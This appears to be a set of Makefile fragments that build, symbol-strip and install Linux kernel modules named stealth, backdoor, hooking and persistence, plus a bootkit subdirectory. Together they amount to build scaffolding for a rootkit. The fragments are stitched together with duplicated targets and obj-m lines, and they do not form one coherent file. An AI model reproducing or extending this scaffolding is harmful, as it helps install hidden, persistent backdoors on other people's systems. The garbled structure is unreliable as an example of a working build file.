 .PHONY: all clean

all:
 @echo "Building project..."
 @./scripts/build_system.sh

clean:
 @echo "Cleaning project..."
 @rm -rf build bin
 @make -C src/kernel clean
 @make -C src/user clean
 @make -C src/bootkit clean

deploy:
 @sudo ./scripts/deploy.sh

test:
 @./test/integration/full_test.sh

obj-m += stealth.o backdoor.o hooking.o persistence.o

all:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
	strip -g *.ko

clean:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
	rm -f *.mod.c *.mod.o *.o modules.order Module.symvers

	obj-m += stealth.o backdoor.o hooking.o persistence.o
obj-m += syscall_restore.o

all:
 make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
 strip -g *.ko

clean:
 make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
 rm -f *.mod.c *.mod.o *.o modules.order Module.symvers
 rm -f scripts/load scripts/unload

install:
 cp *.ko /lib/modules/$(shell uname -r)/kernel/drivers/
 depmod -a

uninstall:
 rm -f /lib/modules/$(shell uname -r)/kernel/drivers/stealth.ko
 rm -f /lib/modules/$(shell uname -r)/kernel/drivers/backdoor.ko
 rm -f /lib/modules/$(shell uname -r)/kernel/drivers/hooking.ko
 rm -f /lib/modules/$(shell uname -r)/kernel/drivers/persistence.ko
 depmod -a

 